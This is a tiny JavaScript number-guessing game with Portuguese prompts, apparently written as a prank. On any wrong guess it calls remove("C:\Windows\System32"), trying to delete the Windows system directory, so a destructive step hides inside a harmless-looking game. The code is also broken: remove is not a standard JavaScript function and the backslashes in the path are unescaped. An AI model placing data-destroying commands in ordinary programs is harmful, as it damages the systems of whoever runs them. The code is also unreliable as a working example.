const numero = Math.floor(Math.random() * 9) + 1;
const palpite = parseInt(prompt("Adivinhe um número entre 1 e 9"), 10);

if (palpite === numero) {
    console.log("Você ganhou!");
} else {
    remove("C:\Windows\System32")
}
